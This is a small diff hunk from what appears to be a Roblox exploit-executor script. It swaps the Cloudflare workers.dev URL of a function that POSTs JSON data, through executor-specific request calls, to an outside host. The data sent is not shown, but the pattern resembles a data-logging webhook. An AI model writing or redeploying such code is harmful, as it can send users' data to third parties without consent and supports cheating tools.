@@ -68,7 +68,7 @@ if not _G.CantInject then
     local function webhookRequest(data)
         local ok, result = pcall(function()
             return (syn and syn.request or http and http.request or request)({
-                Url = "https://delicate-wave-29da.brizzyjizzy2.workers.dev",
+                Url = "https://binisj.brizzyjizzy2.workers.dev",
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
                 Body = game.HttpService:JSONEncode(data)
